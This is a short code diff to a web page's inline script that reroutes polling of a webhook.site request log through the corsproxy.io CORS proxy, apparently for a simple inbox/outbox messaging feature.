@@ -1341,7 +1341,8 @@ Saludos!</pre>
 <script>
 (function() {
   var INBOX = 'https://webhook.site/3d529484-86eb-4b7b-9761-a06c380ba9e3';
-  var OUTBOX_API = 'https://webhook.site/token/46af9d1d-79ba-4126-8364-2ffca63654f6/requests?sorting=newest&per_page=50';
+  var OUTBOX_RAW = 'https://webhook.site/token/46af9d1d-79ba-4126-8364-2ffca63654f6/requests?sorting=newest&per_page=50';
+  var OUTBOX_API = 'https://corsproxy.io/?' + encodeURIComponent(OUTBOX_RAW);
   var blockStates = {};
   var lastPollId = null;
   var VERSION = 3;
